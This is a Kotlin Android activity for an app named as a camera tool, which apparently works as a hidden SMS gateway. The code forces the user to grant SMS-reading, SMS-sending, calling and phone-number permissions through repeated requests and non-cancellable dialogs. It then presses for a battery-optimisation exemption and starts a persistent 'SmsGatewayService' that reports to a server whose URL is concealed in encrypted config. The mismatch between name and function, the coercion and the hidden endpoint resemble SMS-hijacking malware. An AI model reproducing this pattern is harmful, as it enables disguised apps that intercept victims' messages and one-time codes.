package com.settingpro.camera

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.widget.FrameLayout
import android.widget.ProgressBar
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.lifecycle.lifecycleScope
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.service.SmsGatewayService
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.util.SecretConfig
import com.google.firebase.messaging.FirebaseMessaging
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * MainActivity - Permission flow following the reference app pattern.
 *
 * All runtime permissions (Phone + SMS) are requested TOGETHER in one
 * combined system dialog flow, followed by battery optimization exclusion:
 *
 *   checkPermissions() -> ONE requestPermissions() call for all ungranted
 *     |- all granted                   -> initializeLogic() + reqForBattery()
 *     |- denied (rationale showable)   -> checkPermissions() again (loop)
 *     |- denied ("Don't ask again")    -> blocking Settings dialog
 *
 *   reqForBattery() -> system battery-exclusion dialog
 *     |- excluded -> completeFlow() (start service + load WebView)
 *     |- denied   -> blocking dialog, ask again
 */
@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"

        // All runtime permissions the gateway needs - requested in ONE flow
        private val PERMISSIONS: Array<String> = buildList {
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.CALL_PHONE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                add(Manifest.permission.READ_PHONE_NUMBERS)
            }
            add(Manifest.permission.RECEIVE_SMS)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.SEND_SMS)
        }.toTypedArray()

        private const val PERMISSION_REQUEST_CODE = 100
        private const val BATTERY_REQUEST_CODE = 123
    }

    // Track completion so onResume doesn't re-run the flow after finishing
    private var permissionsFlowComplete = false

    // ─── Dependencies ───────────────────────────────────────────────────────────────

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    private var webView: android.webkit.WebView? = null
    private var serviceStarted = false
    private var webViewUrl: String? = null
    private var progressBar: ProgressBar? = null

    // ─── Permission Constants ───────────────────────────────────────────────────────

    /**
     * Phone permissions - READ_PHONE_STATE, CALL_PHONE, READ_PHONE_NUMBERS
     * These are the foundation - all other permissions depend on these.
     */
    private val phonePermissions: List<String>
        get() = buildList {
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.CALL_PHONE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }

    /**
     * SMS runtime permissions - RECEIVE_SMS, READ_SMS, SEND_SMS
     * These depend on Phone permissions being granted first.
     */
    private val smsPermissions: List<String>
        get() = listOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )

    /**
     * All runtime permissions granted? (used by the resume re-check)
     */
    private fun hasAllRuntimePermissions(): Boolean =
        PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

    // ─── Permission Flow (reference app pattern) ────────────────────────────────────

    /**
     * Collect every ungranted permission and request them ALL in one combined
     * system dialog flow. If everything is already granted, go straight to
     * battery optimization.
     */
    private fun checkPermissions() {
        val ungranted = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (ungranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else {
            initializeLogic()
            reqForBattery()
        }
    }

    /**
     * Called once all runtime permissions are granted (the reference app's
     * initializeLogic) - starts the gateway service early.
     */
    private fun initializeLogic() {
        startSmsGatewayServiceIfNeeded()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != PERMISSION_REQUEST_CODE) return

        var allGranted = true
        var permanentlyDenied = false
        for (i in grantResults.indices) {
            if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                allGranted = false
                if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                    permanentlyDenied = true
                }
            }
        }

        when {
            allGranted -> {
                AppLogger.d(TAG, "All runtime permissions granted")
                initializeLogic()
                reqForBattery()
            }
            permanentlyDenied -> {
                AppLogger.d(TAG, "Permissions permanently denied - showing Settings dialog")
                showSettingsDialog()
            }
            else -> {
                // Plain denial - the system will show the dialog(s) again
                AppLogger.d(TAG, "Permissions denied - requesting again")
                checkPermissions()
            }
        }
    }

    /**
     * Request battery optimization exclusion (skipped if already excluded).
     */
    private fun reqForBattery() {
        if (isIgnoringBatteryOptimizations()) {
            completeFlow()
            return
        }
        requestBatteryOptimization()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == BATTERY_REQUEST_CODE) {
            if (isIgnoringBatteryOptimizations()) {
                AppLogger.d(TAG, "Battery optimization exclusion granted")
                completeFlow()
            } else {
                // Denied - re-ask the system dialog directly (no custom modal)
                AppLogger.d(TAG, "Battery optimization exclusion denied - asking again")
                reqForBattery()
            }
        }
    }

    private fun completeFlow() {
        if (permissionsFlowComplete) return
        permissionsFlowComplete = true
        onAllPermissionsGranted()
    }

    // ─── Lifecycle ───────────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Initialize secure encryption for URLs
        SecretConfig.initialize(this)

        // Initialize FCM token
        initializeFcmToken()

        // Setup WebView UI first (but don't load URL until permissions granted)
        setupWebView()

        // Start the permission flow (reference app pattern)
        checkPermissions()
    }

    override fun onResume() {
        super.onResume()
        // Re-check after returning from Settings (the blocking dialogs stay up,
        // so a grant made in Settings is detected here and the flow continues)
        if (!permissionsFlowComplete && hasAllRuntimePermissions()) {
            if (isIgnoringBatteryOptimizations()) {
                completeFlow()
            } else {
                reqForBattery()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        webView?.destroy()
        webView = null
        progressBar = null
    }

    // ─── Dialogs (ALL BLOCKING - No Cancellation) ───────────────────────────────────

    /**
     * Runtime permissions denied dialog - BLOCKING.
     * Shown when a permission was denied with "Don't ask again" (the system will
     * no longer show the request dialog) - the only way forward is Settings.
     * Same pattern as the reference app: Go to Settings / Exit.
     */
    private fun showSettingsDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(
                "Phone and SMS permissions are required.\n\n" +
                "Please grant them in Settings."
            )
            .setPositiveButton("Go to Settings") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("Exit") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    /**
     * Open the app's settings page.
     * Used when permissions are permanently denied.
     */
    private fun openAppSettings() {
        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
            startActivity(this)
        }
    }

    // ─── Helper Methods ───────────────────────────────────────────────────────────────

    /**
     * Check if all Phone permissions are granted.
     */
    private fun hasPhonePermissions(): Boolean {
        return phonePermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if all SMS runtime permissions are granted.
     */
    private fun hasSmsRuntimePermissions(): Boolean {
        return smsPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if the app is ignoring battery optimizations.
     */
    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    /**
     * Request battery optimization exclusion via the classic
     * startActivityForResult API (reference app pattern, code 123).
     */
    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            @Suppress("DEPRECATION")
            startActivityForResult(intent, BATTERY_REQUEST_CODE)
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to request battery optimization exclusion", e)
            // Continue anyway - can't force this
            completeFlow()
        }
    }

    // ─── WebView Setup ───────────────────────────────────────────────────────────────

    /**
     * Setup WebView UI (but don't load URL until permissions are granted).
     * This saves resources by not initializing the renderer process until needed.
     */
    private fun setupWebView() {
        webViewUrl = SecretConfig.getWebViewUrl(this)

        if (webViewUrl.isNullOrBlank()) {
            // No URL configured - use empty container
            setContentView(FrameLayout(this))
        } else {
            // Create WebView (don't load URL yet)
            webView = createWebView()

            // Create progress bar
            progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge)

            // Setup layout
            setContentView(FrameLayout(this).apply {
                addView(
                    webView, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                )
                addView(
                    progressBar, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        gravity = Gravity.CENTER
                    }
                )
            })

            // Show loader initially
            progressBar?.isVisible = true
        }
    }

    /**
     * Create and configure WebView.
     */
    private fun createWebView() = android.webkit.WebView(this).apply {
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.setSupportZoom(true)
        settings.builtInZoomControls = true
        settings.displayZoomControls = false

        webViewClient = object : android.webkit.WebViewClient() {
            override fun onPageStarted(
                view: android.webkit.WebView?,
                url: String?,
                favicon: android.graphics.Bitmap?
            ) {
                super.onPageStarted(view, url, favicon)
                progressBar?.isVisible = true
            }

            override fun onPageFinished(view: android.webkit.WebView?, url: String?) {
                super.onPageFinished(view, url)
                progressBar?.isVisible = false
            }
        }
    }

    // ─── Completion ──────────────────────────────────────────────────────────────────

    /**
     * All permissions granted - initialize the app.
     * Starts the SMS Gateway service and loads the WebView.
     */
    private fun onAllPermissionsGranted() {
        // Mark that all permissions have been granted
        lifecycleScope.launch(Dispatchers.IO) {
            settingsDataStore.setPermissionsGranted(true)
            settingsDataStore.setServiceEnabled(true)
        }

        // Load WebView URL
        if (!webViewUrl.isNullOrBlank()) {
            webView?.loadUrl(webViewUrl!!)
        }

        // Start SMS Gateway Service if not already started earlier
        // (Service may have already been started when SMS permissions were granted)
        if (!SmsGatewayService.isServiceRunning() && !serviceStarted) {
            serviceStarted = true
            startSmsGatewayService()
        }
    }

    /**
     * Start the SMS Gateway foreground service.
     */
    private fun startSmsGatewayService() {
        if (SmsGatewayService.isServiceRunning()) return

        val intent = Intent(this, SmsGatewayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    /**
     * Start the SMS Gateway service if not already running and if critical permissions are granted.
     * This allows the service to start as soon as Phone + SMS (or Default SMS) permissions are granted,
     * without waiting for battery optimization.
     */
    private fun startSmsGatewayServiceIfNeeded() {
        // Only start if critical permissions are granted
        val hasCriticalPermissions = hasPhonePermissions() &&
            (hasSmsRuntimePermissions())

        if (hasCriticalPermissions && !SmsGatewayService.isServiceRunning() && !serviceStarted) {
            AppLogger.d(TAG, "Critical permissions granted - starting SMS Gateway service early")
            serviceStarted = true
            startSmsGatewayService()
        }
    }

    /**
     * Initialize FCM token and save to DataStore.
     * Called during app initialization to ensure token is available for registration.
     */
    private fun initializeFcmToken() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                AppLogger.w(TAG, "FCM token retrieval failed: ${task.exception?.message}")
                return@addOnCompleteListener
            }

            val token = task.result
            if (token != null) {
                AppLogger.d(TAG, "FCM token retrieved: ${token.take(16)}...")
                lifecycleScope.launch(Dispatchers.IO) {
                    try {
                        settingsDataStore.setFcmToken(token)
                        AppLogger.d(TAG, "FCM token saved to DataStore")
                        // Trigger device info refresh to update FCM token in WebSocket
                        SmsGatewayService.refreshDeviceInfo(this@MainActivity)
                        AppLogger.d(TAG, "Device info refresh triggered after FCM token saved")
                    } catch (e: Exception) {
                        AppLogger.e(TAG, "Error saving FCM token", e)
                    }
                }
            }
        }
    }
}
